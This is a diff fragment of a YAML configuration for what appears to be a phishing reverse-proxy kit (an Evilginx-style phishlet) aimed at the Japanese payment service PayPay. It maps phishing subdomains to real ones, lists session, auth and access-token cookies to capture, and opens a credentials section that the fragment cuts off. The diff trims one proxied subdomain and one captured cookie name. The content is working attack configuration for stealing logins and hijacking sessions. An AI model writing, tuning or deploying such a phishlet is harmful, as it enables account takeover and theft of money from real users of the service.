@@ -20,14 +20,10 @@ proxy_hosts:
     orig_sub: 'image'
     domain: 'paypay.ne.jp'
     session: false
-  - phish_sub: 'portal'
-    orig_sub: 'www'
-    domain: 'paypay.ne.jp'
-    session: true
 
 auth_tokens:
   - domain: '.paypay.ne.jp'
-    keys: ['session', 'sessionid', 'auth_token', 'access_token', 'token', 'paypay_session']
+    keys: ['session', 'sessionid', 'auth_token', 'access_token', 'token']
     type: 'cookie'
 
 credentials:
